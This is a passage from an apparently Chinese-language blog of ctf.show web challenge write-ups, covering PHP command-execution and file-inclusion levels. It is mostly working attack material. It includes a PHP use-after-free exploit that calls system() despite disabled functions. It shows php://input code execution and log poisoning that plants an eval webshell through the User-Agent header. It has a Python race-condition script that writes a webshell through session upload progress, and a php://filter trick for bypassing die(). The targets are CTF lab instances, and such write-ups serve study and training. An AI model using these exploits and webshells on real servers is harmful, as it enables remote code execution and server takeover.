class="variable">$deref</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$leak</span>);</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$deref</span> != <span class="number">0x786568326e6962</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$data_addr</span> + <span class="variable">$i</span> * <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_binary_base</span>(<span class="params"><span class="variable">$binary_leak</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$base</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="variable">$start</span> = <span class="variable">$binary_leak</span> &amp; <span class="number">0xfffffffffffff000</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">0x1000</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$addr</span> = <span class="variable">$start</span> - <span class="number">0x1000</span> * <span class="variable">$i</span>;</span><br><span class="line">            <span class="variable">$leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span>, <span class="number">0</span>, <span class="number">7</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> == <span class="number">0x10102464c457f</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="variable">$addr</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_system</span>(<span class="params"><span class="variable">$basic_funcs</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$addr</span> = <span class="variable">$basic_funcs</span>;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            <span class="variable">$f_entry</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span>);</span><br><span class="line">            <span class="variable">$f_name</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$f_entry</span>, <span class="number">0</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$f_name</span> == <span class="number">0x6d6574737973</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span> + <span class="number">8</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$addr</span> += <span class="number">0x20</span>;</span><br><span class="line">        &#125; <span class="keyword">while</span>(<span class="variable">$f_entry</span> != <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">trigger_uaf</span>(<span class="params"><span class="variable">$arg</span></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$arg</span> = <span class="title function_ invoke__">str_shuffle</span>(<span class="string">&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;</span>);</span><br><span class="line">        <span class="variable">$vuln</span> = <span class="keyword">new</span> <span class="title class_">Vuln</span>();</span><br><span class="line">        <span class="variable">$vuln</span>-&gt;a = <span class="variable">$arg</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">stristr</span>(PHP_OS, <span class="string">&#x27;WIN&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;This PoC is for *nix systems only.&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$n_alloc</span> = <span class="number">10</span>; </span><br><span class="line">    <span class="variable">$contiguous</span> = [];</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n_alloc</span>; <span class="variable">$i</span>++)</span><br><span class="line">        <span class="variable">$contiguous</span>[] = <span class="title function_ invoke__">str_shuffle</span>(<span class="string">&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">trigger_uaf</span>(<span class="string">&#x27;x&#x27;</span>);</span><br><span class="line">    <span class="variable">$abc</span> = <span class="variable">$backtrace</span>[<span class="number">1</span>][<span class="string">&#x27;args&#x27;</span>][<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$helper</span> = <span class="keyword">new</span> <span class="title class_">Helper</span>;</span><br><span class="line">    <span class="variable">$helper</span>-&gt;b = <span class="function"><span class="keyword">function</span> (<span class="params"><span class="variable">$x</span></span>) </span>&#123; &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$abc</span>) == <span class="number">79</span> || <span class="title function_ invoke__">strlen</span>(<span class="variable">$abc</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;UAF failed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$closure_handlers</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="variable">$php_heap</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0x58</span>);</span><br><span class="line">    <span class="variable">$abc_addr</span> = <span class="variable">$php_heap</span> - <span class="number">0xc8</span>;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x60</span>, <span class="number">2</span>);</span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x70</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x10</span>, <span class="variable">$abc_addr</span> + <span class="number">0x60</span>);</span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x18</span>, <span class="number">0xa</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$closure_obj</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$binary_leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$closure_handlers</span>, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$base</span> = <span class="title function_ invoke__">get_binary_base</span>(<span class="variable">$binary_leak</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t determine binary base address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$elf</span> = <span class="title function_ invoke__">parse_elf</span>(<span class="variable">$base</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t parse ELF header&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$basic_funcs</span> = <span class="title function_ invoke__">get_basic_funcs</span>(<span class="variable">$base</span>, <span class="variable">$elf</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get basic_functions address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$zif_system</span> = <span class="title function_ invoke__">get_system</span>(<span class="variable">$basic_funcs</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get zif_system address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="variable">$fake_obj_offset</span> = <span class="number">0xd0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">0x110</span>; <span class="variable">$i</span> += <span class="number">8</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="variable">$fake_obj_offset</span> + <span class="variable">$i</span>, <span class="title function_ invoke__">leak</span>(<span class="variable">$closure_obj</span>, <span class="variable">$i</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x20</span>, <span class="variable">$abc_addr</span> + <span class="variable">$fake_obj_offset</span>);</span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0xd0</span> + <span class="number">0x38</span>, <span class="number">1</span>, <span class="number">4</span>); </span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0xd0</span> + <span class="number">0x68</span>, <span class="variable">$zif_system</span>); </span><br><span class="line"></span><br><span class="line">    (<span class="variable">$helper</span>-&gt;b)(<span class="variable">$cmd</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">ctfshow</span>(<span class="string">&quot;cat /flag0.txt&quot;</span>);<span class="title function_ invoke__">ob_end_flush</span>();</span><br><span class="line"><span class="comment">#需要通过url编码哦</span></span><br></pre></td></tr></table></figure>

<h4><span id="web73">web73</span></h4><p>先读取目录</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&#x27;glob:///*&#x27;</span>);<span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;<span class="keyword">echo</span>(<span class="variable">$f</span>-&gt;<span class="title function_ invoke__">__toString</span>().<span class="string">&quot; &quot;</span>);&#125;;<span class="keyword">exit</span>();</span><br><span class="line"><span class="comment"># 或者</span></span><br><span class="line"><span class="title function_ invoke__">var_export</span>(<span class="title function_ invoke__">scandir</span>(<span class="string">&#x27;/&#x27;</span>));<span class="keyword">die</span>();</span><br><span class="line"><span class="comment"># 或者</span></span><br><span class="line">c=<span class="variable">$d</span>=<span class="title function_ invoke__">opendir</span>(<span class="string">&quot;/&quot;</span>);<span class="keyword">while</span>(<span class="literal">false</span>!==(<span class="variable">$f</span>=<span class="title function_ invoke__">readdir</span>(<span class="variable">$d</span>)))&#123;<span class="keyword">echo</span><span class="string">&quot;<span class="subst">$f</span>\n&quot;</span>;&#125;;<span class="keyword">exit</span>();</span><br><span class="line"><span class="comment"># 或者</span></span><br><span class="line">c=<span class="variable">$a</span>=<span class="string">&quot;glob:///*&quot;</span>;<span class="keyword">if</span>(<span class="variable">$b</span>=<span class="title function_ invoke__">opendir</span>(<span class="variable">$a</span>))&#123;<span class="keyword">while</span>((<span class="variable">$file</span>=<span class="title function_ invoke__">readdir</span>(<span class="variable">$b</span>))!==<span class="literal">false</span>)&#123;<span class="keyword">echo</span> <span class="variable">$file</span>.<span class="string">&quot;\n&quot;</span>;&#125;<span class="title function_ invoke__">closedir</span>(<span class="variable">$b</span>);&#125;<span class="keyword">exit</span>();</span><br></pre></td></tr></table></figure>

<p>然后include</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="keyword">include</span>(<span class="string">&#x27;/flagc.txt&#x27;</span>);<span class="keyword">exit</span>();</span><br></pre></td></tr></table></figure>

<p>上题的uaf代码中strlen被ban了，我们可以写一个代替</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">strlen_user</span>(<span class="params"><span class="variable">$s</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$ret</span>=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="number">100000</span>;<span class="variable">$i</span>++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$s</span>[<span class="variable">$i</span>])&#123;</span><br><span class="line">                <span class="variable">$ret</span>=<span class="variable">$ret</span>+<span class="number">1</span>;  </span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$ret</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3><span id="文件包含">文件包含</span></h3><ul>
<li><p>nginx日志的默认路径为&#x2F;var&#x2F;log&#x2F;nginx.</p>
</li>
<li><p>ssh日志的默认路径为&#x2F;var&#x2F;log&#x2F;auth.log</p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html">filter妙用</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8163"><strong>file_put_content和死亡·杂糅代码之缘</strong></a></p>
</li>
</ul>
<h4><span id="web80">web80</span></h4><ul>
<li>如果过滤了<code>php</code>可以用PHP来绕过，但是<code>data</code>不能用DATA来绕过</li>
<li><strong>php:&#x2F;&#x2F;input</strong>可以访问请求的原始数据的只读流，将post请求的数据当作php代码执行。当传入的参数作为文件名打开时，可以将参数设为php:&#x2F;&#x2F;input,同时post想设置的文件内容，php执行时会将post内容当作文件内容。从而导致任意代码执行。</li>
<li>判断是否可以进行日志注入，判断的条件是是否可以进行<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=ssrf%E6%BC%8F%E6%B4%9E&spm=1001.2101.3001.7020">ssrf漏洞</a>,传参&#x2F;etc&#x2F;passwd，如果成功，则代表可以进行日志注入</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><p>方法一：Php绕过</p>
<p>使用burpsuit</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/?file=Php://input</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>7c1020fb-ad70-446e-aa9f-96f37da1dd90.challenge.ctf.show</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>20</span><br><span class="line"></span><br><span class="line"><span class="language-php"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;ls&#x27;</span>)<span class="meta">?&gt;</span></span></span><br><span class="line"><span class="language-php"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;tac fl0g.php&#x27;</span>)<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
</li>
<li><p>方法二：日志注入</p>
<ul>
<li><p>Get传参<code>/?file=/var/log/nginx/access.log</code>，找到日志地址（一个个常用地址试试看）</p>
</li>
<li><p>然后在UA里面藏入一句话木马 <?php eval($_POST['shell']); ?></p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/?file=/var/log/nginx/access.log</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>7c1020fb-ad70-446e-aa9f-96f37da1dd90.challenge.ctf.show</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>&lt;?php eval($_POST[&#x27;a&#x27;]); ?&gt;</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>0</span><br></pre></td></tr></table></figure>
</li>
<li><p>使用🐜🗡连接</p>
<ul>
<li><a target="_blank" rel="noopener" href="http://f3c8bad1-a762-443f-9d81-4dd4919dd85f.challenge.ctf.show/?file=/var/log/nginx/access.log">http://f3c8bad1-a762-443f-9d81-4dd4919dd85f.challenge.ctf.show/?file=/var/log/nginx/access.log</a></li>
<li>密码:a</li>
</ul>
</li>
<li><p>或者直接在UA里面执行代码就行了，<strong>注意别输错了，否则需要重启实例</strong></p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/?file=/var/log/nginx/access.log</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>f3c8bad1-a762-443f-9d81-4dd4919dd85f.challenge.ctf.show</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>&lt;?php system(&#x27;tac fl0g.php&#x27;); ?&gt;</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>0</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
<h4><span id="web83">web83</span></h4><ul>
<li>因为过滤了点所以应该是无后缀形式的，<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/10662"><strong>而php中我们唯一能控制的无后缀的就是session文件</strong></a></li>
<li><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/275557.html">条件竞争</a></li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">url=<span class="string">&#x27;http://9a77fcb3-6f3c-4bd6-a247-07bfe6766509.challenge.ctf.show:8080/&#x27;</span></span><br><span class="line">sessionid=<span class="string">&#x27;ctfshow&#x27;</span></span><br><span class="line">data=&#123;</span><br><span class="line">	<span class="string">&quot;1&quot;</span>:<span class="string">&quot;file_put_contents(&#x27;/var/www/html/jiuzhen.php&#x27;,&#x27;&lt;?php eval($_POST[3]);?&gt;&#x27;);&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#这个是访问/tmp/sess_ctfshow时，post传递的内容，是在网站目录下写入一句话木马。这样一旦访问成功，就可以蚁剑连接了。</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>(<span class="params">session</span>):<span class="comment">#/tmp/sess_ctfshow中写入一句话木马。</span></span><br><span class="line">	fileBytes = io.BytesIO(<span class="string">b&#x27;a&#x27;</span>*<span class="number">1024</span>*<span class="number">50</span>)</span><br><span class="line">	<span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">		response=session.post(url,</span><br><span class="line">			data=&#123;</span><br><span class="line">			<span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>:<span class="string">&#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;</span></span><br><span class="line">			&#125;,</span><br><span class="line">			cookies=&#123;</span><br><span class="line">			<span class="string">&#x27;PHPSESSID&#x27;</span>:sessionid</span><br><span class="line">			&#125;,</span><br><span class="line">			files=&#123;</span><br><span class="line">			<span class="string">&#x27;file&#x27;</span>:(<span class="string">&#x27;ctfshow.jpg&#x27;</span>,fileBytes)</span><br><span class="line">			&#125;</span><br><span class="line">			)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>(<span class="params">session</span>):<span class="comment">#访问/tmp/sess_ctfshow，post传递信息，在网站目录下写入木马。</span></span><br><span class="line">	<span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">		response=session.post(url+<span class="string">&#x27;?file=/tmp/sess_&#x27;</span>+sessionid,data=data,</span><br><span class="line">			cookies=&#123;</span><br><span class="line">			<span class="string">&#x27;PHPSESSID&#x27;</span>:sessionid</span><br><span class="line">			&#125;</span><br><span class="line">			)</span><br><span class="line">		resposne2=session.get(url+<span class="string">&#x27;jiuzhen.php&#x27;</span>);<span class="comment">#访问木马文件，如果访问到了就代表竞争成功</span></span><br><span class="line">		<span class="keyword">if</span> resposne2.status_code==<span class="number">200</span>:了</span><br><span class="line">			<span class="built_in">print</span>(<span class="string">&#x27;++++++done++++++&#x27;</span>)</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			<span class="built_in">print</span>(resposne2.status_code)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"></span><br><span class="line">	evnet=threading.Event()</span><br><span class="line">	<span class="comment">#写入和访问分别设置5个线程。</span></span><br><span class="line">	<span class="keyword">with</span> requests.session() <span class="keyword">as</span> session:</span><br><span class="line">		<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">			threading.Thread(target=write,args=(session,)).start()</span><br><span class="line">		<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">			threading.Thread(target=read,args=(session,)).start()</span><br><span class="line"></span><br><span class="line">	evnet.<span class="built_in">set</span>()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4><span id="web87">web87</span></h4><ul>
<li>提交的方式要使用<code>Content-Type: application/x-www-form-urlencoded</code>，否则无法成功，这种题其实可以用POSTMan做，没必要用burpsuite抓包，如果要抓，必须带上上面这句Content-type</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$content</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$file</span>), <span class="string">&quot;&lt;?php die(&#x27;大佬别秀了&#x27;);?&gt;&quot;</span>.<span class="variable">$content</span>);</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这道题需要绕过die函数，我们要使其无效，否则影响我们提交的内容。</p>
<p>思路可以参考[文件包含](# 文件包含)底下的链接</p>
<ul>
<li><p>方法一：用base64 编码<br>使用url编码<code>file=php://filter/write=convert.base64-decode/resource=flag.php</code>，</p>
<p>需要把字母也编码，然后再进行一次url编码</p>
